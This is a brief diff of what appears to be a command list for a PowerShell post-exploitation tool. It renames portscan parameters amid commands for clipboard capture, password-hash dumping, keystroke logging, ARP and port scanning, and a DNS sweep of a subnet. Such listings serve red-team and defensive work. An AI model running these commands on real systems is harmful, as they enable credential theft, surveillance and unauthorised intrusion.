@@ -342,7 +342,7 @@ get-clipboard
 hashdump
 get-keystrokes | get-keystrokedata
 arpscan -ipcidr 10.0.0.1/24
-portscan -ipaddress 10.0.0.1-50 -ports "1-65535" -maxqueriesps 10000 -delay 0
+portscan -hosts 10.0.0.1-50 -ports "1-65535" -threads 10000 -delay 0
 ((new-object Net.Sockets.TcpClient).connect("10.0.0.1",445))
 get-netstat | %{"$($_.Protocol) $($_.LocalAddress):$($_.LocalPort) $($_.RemoteAddress):$($_.RemotePort) $($_.State) $($_.ProcessName)($($_.PID))"}
 1..254 | %{ try {[System.Net.Dns]::GetHostEntry("10.0.0.$_") } catch {} }|select hostname
